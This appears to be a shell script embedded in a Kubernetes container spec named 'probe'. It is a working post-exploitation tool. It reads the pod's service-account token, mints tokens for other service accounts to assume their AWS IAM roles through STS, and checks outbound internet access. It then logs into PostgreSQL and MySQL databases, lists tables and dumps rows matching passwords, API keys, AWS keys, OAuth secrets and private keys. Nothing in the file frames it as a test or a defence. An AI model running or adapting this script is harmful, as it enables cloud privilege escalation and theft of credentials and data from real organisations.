containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
post(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data="$2" "$1" 2>/dev/null; }
echo "===I3550_START env=stage utc=$(date -u +%FT%TZ)==="
apk add --no-cache postgresql16-client mariadb-client curl jq gzip aws-cli >/tmp/apk1.log 2>&1
echo "apk1_rc=$? psql=$(command -v psql || echo none) mysql=$(command -v mysql || echo none)"
[ -x "$(command -v psql)" ] || { apk add --no-cache postgresql-client >/tmp/apk2.log 2>&1; echo "apk2_rc=$? psql=$(command -v psql || echo none)"; }
EG=$(curl -s -m 20 http://ip-api.com/json/); echo "EGRESS $EG"
CUR=""
assume(){
  NS=$1; S=$2; SESS=$3
  SAJ=$(get "$API/api/v1/namespaces/$NS/serviceaccounts/$S")
  AR=$(echo "$SAJ" | jq -r '.metadata.annotations["eks.amazonaws.com/role-arn"] // empty')
  [ -z "$AR" ] && { echo "ROLE_NONE $NS/$S"; return 1; }
  TK=$(post "$API/api/v1/namespaces/$NS/serviceaccounts/$S/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty')
  [ -z "$WT" ] && { echo "TOKEN_FAIL $NS/$S"; return 1; }
  RES=$(aws sts assume-role-with-web-identity --role-arn "$AR" --role-session-name "$SESS" --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>&1)
  echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1 || { echo "ASSUME_FAIL $NS/$S $(echo "$RES"|head -c 160|tr '\n' ' ')"; return 1; }
  export AWS_ACCESS_KEY_ID=$(echo "$RES"|jq -r .Credentials.AccessKeyId)
  export AWS_SECRET_ACCESS_KEY=$(echo "$RES"|jq -r .Credentials.SecretAccessKey)
  export AWS_SESSION_TOKEN=$(echo "$RES"|jq -r .Credentials.SessionToken)
  CUR="$NS/$S"; echo "ASSUME_OK $NS/$S role=$AR"; return 0
}
unassume(){ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN; CUR=""; }
GREP='password|passwd|secret|token|api[_-]?key|apikey|credential|AKIA|ASIA|Bearer|client_secret|PRIVATE KEY|mysql://|postgres://|redis://|SETTINGS|DSN'

pgprobe(){
  LBL=$1; H=$2; PH=$3; DB=$4; U=$5; PW=$6
  echo "=== DB $LBL host=$H db=$DB user=$U ==="
  Q1=$(PGPASSWORD="$PW" psql "host=$H port=5432 user=$U dbname=$DB sslmode=require connect_timeout=20" -At -c "select version();" 2>&1 | head -3)
  echo "PG_VERSION[$LBL] $(echo "$Q1" | tr '\n' ' ' | cut -c1-300)"
  case "$Q1" in *PostgreSQL*) ;; *)
     echo "PG_PROXY_TRY[$LBL]"
     Q1=$(PGPASSWORD="$PW" psql "host=$PH port=5432 user=$U dbname=$DB sslmode=require connect_timeout=20" -At -c "select version();" 2>&1 | head -3)
     echo "PG_VERSION_PROXY[$LBL] $(echo "$Q1" | tr '\n' ' ' | cut -c1-300)"
     case "$Q1" in *PostgreSQL*) H=$PH; echo "PG_USE_PROXY[$LBL]";; *) echo "PG_FAIL[$LBL]"; return 0;; esac ;;
  esac
  echo "PG_USER[$LBL] $(PGPASSWORD="$PW" psql "host=$H port=5432 user=$U dbname=$DB sslmode=require connect_timeout=20" -At -c 'select current_user;' 2>&1 | head -2 | tr '\n' ' ')"
  echo "PG_DB_$LBL: $(PGPASSWORD="$PW" psql "host=$H port=5432 user=$U dbname=$DB sslmode=require connect_timeout=20" -At -c 'select datname from pg_database;' 2>&1 | tr '\n' ' ' | cut -c1-400)"
  TBLS=$(PGPASSWORD="$PW" psql "host=$H port=5432 user=$U dbname=$DB sslmode=require connect_timeout=20" -At -c "select table_schema||'.'||table_name from information_schema.tables where table_schema not in ('pg_catalog','information_schema') order by 1 limit 80" 2>&1)
  echo "PG_TBL_$LBL n=$(echo "$TBLS" | grep -c .)"
  echo "$TBLS" | tr '\n' ' ' | cut -c1-1800; echo
  CAND=$(echo "$TBLS" | grep -Ei 'oauth|setting|user|secret|api_?key|credential|config|token|auth|tenant|integration|smtp|mail|ldap' | head -20)
  echo "PG_CAND_$LBL n=$(echo "$CAND" | grep -c .)"
  i=0
  for T in $CAND; do
    i=$((i+1))
    CNT=$(PGPASSWORD="$PW" psql "host=$H port=5432 user=$U dbname=$DB sslmode=require connect_timeout=20" -At -c "select count(*) from $T" 2>/dev/null)
    echo "--- TBL $LBL $T rows=$CNT"
    PGPASSWORD="$PW" psql "host=$H port=5432 user=$U dbname=$DB sslmode=require connect_timeout=20" -At -F'|' -c "select * from $T limit 50" 2>/dev/null | grep -aiE "$GREP" | head -5 | cut -c1-400
    PGPASSWORD="$PW" psql "host=$H port=5432 user=$U dbname=$DB sslmode=require connect_timeout=20" -At -F'|' -c "select * from $T limit 2" 2>/dev/null | head -2 | cut -c1-260
  done
  echo "PG_DONE_$LBL tables_dumped=$i"
}

myprobe(){
  LBL=$1; H=$2; PH=$3; DB=$4; U=$5; PW=$6
  echo "=== DB $LBL host=$H db=$DB user=$U ==="
  Q1=$(MYSQL_PWD="$PW" mysql --connect-timeout=20 -h "$H" -P 3306 -u "$U" -D "$DB" -N -B -e "select version(), current_user();" 2>&1 | head -3)
  echo "MY_VERSION[$LBL] $(echo "$Q1" | tr '\n' ' ' | cut -c1-300)"
  case "$Q1" in [0-9]*.[0-9]*) ;; *) echo "MY_PROXY_TRY[$LBL]"; Q1=$(MYSQL_PWD="$PW" mysql --connect-timeout=20 -h "$PH" -P 3306 -u "$U" -D "$DB" -N -B -e "select version(), current_user();" 2>&1 | head -3); echo "MY_VERSION_PROXY[$LBL] $(echo "$Q1" | tr '\n' ' ' | cut -c1-300)"; case "$Q1" in [0-9]*.[0-9]*) H=$PH ;; *) echo "MY_FAIL[$LBL]"; return 0;; esac ;;
  esac
  echo "MY_DB_$LBL $(MYSQL_PWD="$PW" mysql --connect-timeout=20 -h "$H" -P 3306 -u "$U" -N -B -e 'show databases;' 2>&1 | tr '\n' ' ' | cut -c1-400)"
  TBLS=$(MYSQL_PWD="$PW" mysql --connect-timeout=20 -h "$H" -P 3306 -u "$U" -D "$DB" -N -B -e "select table_name from information_schema.tables where table_schema='$DB' order by 1 limit 80" 2>&1)
  echo "MY_TBL_$LBL n=$(echo "$TBLS" | grep -c .)"
  echo "$TBLS" | tr '\n' ' ' | cut -c1-1800; echo
  CAND=$(echo "$TBLS" | grep -Ei 'oauth|setting|user|secret|api_?key|credential|config|token|auth|tenant|integration|smtp|mail|ldap' | head -20)
  echo "MY_CAND_$LBL n=$(echo "$CAND" | grep -c .)"
  i=0
  for T in $CAND; do
    i=$((i+1))
    CNT=$(MYSQL_PWD="$PW" mysql --connect-timeout=20 -h "$H" -P 3306 -u "$U" -D "$DB" -N -B -e "select count(*) from \`$T\`" 2>/dev/null)
    echo "--- TBL $LBL $T rows=$CNT"
    MYSQL_PWD="$PW" mysql --connect-timeout=20 -h "$H" -P 3306 -u "$U" -D "$DB" -N -B -e "select * from \`$T\` limit 50" 2>/dev/null | grep -aiE "$GREP" | head -5 | cut -c1-400
    MYSQL_PWD="$PW" mysql --connect-timeout=20 -h "$H" -P 3306 -u "$U" -D "$DB" -N -B -e "select * from \`$T\` limit 2" 2>/dev/null | head -2 | cut -c1-260
  done
  echo "MY_DONE_$LBL tables_dumped=$i"
}
